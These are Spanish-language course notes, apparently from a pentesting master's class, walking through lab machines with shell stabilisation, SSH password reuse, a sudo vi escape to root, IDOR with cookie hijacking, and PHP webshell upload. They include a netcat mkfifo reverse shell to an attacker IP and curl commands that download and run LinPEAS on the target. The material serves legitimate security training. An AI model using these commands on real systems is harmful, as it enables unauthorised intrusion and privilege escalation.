**Contexto y hilo de la sesión**

Yuba abre con un bloque de actualidad del sector que merece quedar registrado, porque vertebra la mentalidad del máster: la industria está girando del paradigma de gestión de CVEs al paradigma de **attack paths**, rutas de ataque encadenadas. Las herramientas ya no se limitan a decirte qué vulnerabilidad tienes, sino a mostrarte cómo un atacante puede encadenarlas para comprometer la infraestructura completa. Eso es exactamente lo que se practica en cada máquina: no vulnerabilidades aisladas, sino cadenas de explotación.

**Estabilización completa de la TTY — el proceso definitivo**

Este es uno de los bloques más importantes de la sesión porque se explica por primera vez de forma ordenada y con el razonamiento detrás de cada paso. Toda reverse shell obtenida, ya sea desde SQLMap, desde una webshell o desde cualquier otro vector, llega como una shell incompleta: no funciona el historial, no funciona el autocompletado, control+C mata la sesión entera, y editores como vi o nano no arrancan. El objetivo es convertirla en una shell operativa completa.

El proceso completo, paso a paso:

```
# Paso 1: crear una pseudo-terminal con Python
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Paso 2: suspender el proceso y mandarlo a background
# (Ctrl+Z)

# Paso 3: reconfigurar la terminal local para que pase
# las pulsaciones directamente a la sesión remota
stty raw -echo; fg

# Paso 4: resetear la terminal remota
reset

# Paso 5: definir el tipo de terminal
export TERM=xterm
```

Cada paso tiene su razón de ser: el módulo pty de Python crea una pseudo-terminal que puede gestionar señales y control de teclado. El stty raw -echo desactiva el procesamiento local de las pulsaciones, de forma que control+C ya no mata la sesión local sino que se envía a la remota. El fg recupera el proceso suspendido. El export TERM=xterm declara el tipo de terminal para que herramientas como clear, vi o top sepan cómo renderizar la pantalla.

Si Python3 no está disponible en la máquina objetivo, existen alternativas. Si se quieren colores en la terminal: export TERM=xterm-256color. Este proceso se repetirá en prácticamente todas las máquinas a partir de ahora.

- **La idea clave:** una reverse shell sin estabilizar es una herramienta a medias. El proceso de estabilización convierte una conexión frágil en una terminal completamente funcional. Aprenderlo de memoria ahorra mucho tiempo en cada máquina

**Crocodile — Cierre: SSH con credenciales de la base de datos**

Partiendo de la shell obtenida como postgres mediante SQLMap, el siguiente paso es enumerar el sistema. En /var/www/html aparece el fichero dashboard.php con las credenciales de conexión a la base de datos en texto plano: usuario, contraseña y puerto. Esto es un error de configuración clásico: credenciales hardcodeadas en el código fuente.

La hipótesis que se debe formular es siempre la misma ante credenciales encontradas: **reutilización de contraseñas**. Si alguien configuró el servicio de base de datos con su contraseña de usuario del sistema, SSH puede funcionar:

```
ssh postgres@IP
```

Funciona. Una vez dentro como el usuario real del sistema, la primera comprobación es siempre:

```
sudo -l
```

Devuelve que postgres puede ejecutar /bin/vi sobre un fichero de configuración específico como cualquier usuario, incluido root. La escalada usa GTFOBins:

```
sudo /bin/vi /etc/postgresql/.../postgresql.conf
# Dentro de vi, en modo comando:
:set shell=/bin/bash
:shell
# O directamente:
:!/bin/bash
```

El razonamiento es crítico: quien está abriendo vi en ese momento es root, porque se está ejecutando con sudo. Cuando vi lanza una shell, esa shell hereda el usuario que está ejecutando vi, que es root. No es un truco oscuro, es consecuencia directa de los permisos otorgados.

- **La idea clave:** siempre que sudo -l devuelva un binario ejecutable como root, buscar ese binario en GTFOBins. La mayor parte de los editores de texto, intérpretes y herramientas de sistema tienen alguna funcionalidad que permite escapar a una shell

**Archetype — IDOR y Cookie Hijacking**

La máquina Archetype introduce dos vulnerabilidades nuevas que ya se habían visto brevemente con Carlos Castillo pero aquí se consolidan.

**IDOR (Insecure Direct Object Reference):** la URL del panel contiene un parámetro id=2. Al cambiarlo a id=1 aparece el perfil del administrador con sus datos, incluido su accessID. La vulnerabilidad consiste en que el servidor no valida si el usuario tiene permiso para ver ese recurso concreto, solo sirve el contenido correspondiente al ID que se le pide.

**Cookie hijacking:** con el accessID del administrador obtenido vía IDOR, se abre el inspector del navegador, se va a Storage → Cookies, y se sustituye el valor de la cookie de sesión propia por el del administrador. Al recargar la página, el servidor considera que somos el administrador.

- **La metáfora útil:** IDOR es como una taquilla numerada sin llave: el número 2 te asignan cuando te registras, pero nada impide que pruebes el número 1. El servidor asume que quien pide el número 1 es quien tiene derecho a verlo, sin comprobarlo
    

---

**Archetype — File Upload y Ejecución de Código**

Una vez autenticados como administrador, aparece un panel de subida de ficheros. El servidor está escrito en PHP y ejecuta los ficheros PHP que se suben. El vector es el mismo que en sesiones anteriores: subir una webshell PHP, acceder a ella por la URL, y desde ahí pivotar a una reverse shell.

La reverse shell que se menciona como más fiable cuando otras fallan es la de Netcat con MKFIFO:

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc NUESTRA_IP 4444 > /tmp/f
```

La referencia canónica para encontrar reverse shells listas para usar es [revshells.com](http://revshells.com/). Si una no funciona, se prueba otra. El motivo por el que una shell puede no funcionar es que el binario no esté disponible en la máquina objetivo (no todas tienen Python, no todas tienen bash en esa ruta, etc.).

**LinPEAS y Yuba Mil — Enumeración automática para escalada**

Una vez dentro de una máquina como usuario sin privilegios, la escalada de privilegios requiere enumeración. La primera comprobación siempre es manual:

```
sudo -l                                    # permisos sudo
find / -perm -u=s -type f 2>/dev/null     # binarios con SUID
id                                         # grupos del usuario actual
```

Si ninguna de estas rutas rápidas da resultado, se lanza **LinPEAS**, un script de Carlos Polop (autor de HackTricks) que automatiza la enumeración de decenas de vectores de escalada. El código de colores es fundamental: rojo indica alta probabilidad de vector explotable, amarillo indica que merece revisión.

El problema de LinPEAS es que la salida es enorme y, lanzada directamente sobre la reverse shell, puede romper la conexión o saturar la terminal. Para resolverlo, Yuba presenta **Yuba Mil** (yuval-mil/parsinpeass en GitHub), una herramienta que:

1. Levanta un servidor receptor en la Cali con python3 [receiver.py](http://receiver.py/)
    
2. Desde la máquina objetivo, lanza un curl hacia ese servidor que descarga, ejecuta LinPEAS y devuelve el output directamente a la Cali en formato HTML
    
3. El resultado se puede navegar cómodamente en el navegador con colores y estructura
    

Para la transferencia de archivos entre la Cali y la máquina objetivo, el patrón es siempre el mismo: levantar un servidor HTTP con Python en la Cali y hacer curl desde el objetivo:

```
# En la Cali
python3 -m http.server 8080

# En la máquina objetivo
curl http://NUESTRA_IP:8080/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Grupos inusuales como vector de escalada**

Al entrar como el usuario Robert en la máquina Archetype (usando credenciales encontradas en texto plano en el código fuente del panel web), el comando id revela algo interesante: Robert pertenece al grupo bugtracker. Este grupo no es estándar del sistema, lo que significa que alguien lo creó con algún propósito, y ese propósito puede haber dejado permisos mal configurados.

La búsqueda de ficheros con permisos de grupo sobre bugtracker puede revelar binarios o scripts que Robert puede ejecutar y que otros usuarios no pueden. Este es el hilo que se deja abierto para la próxima sesión de escalada de privilegios.
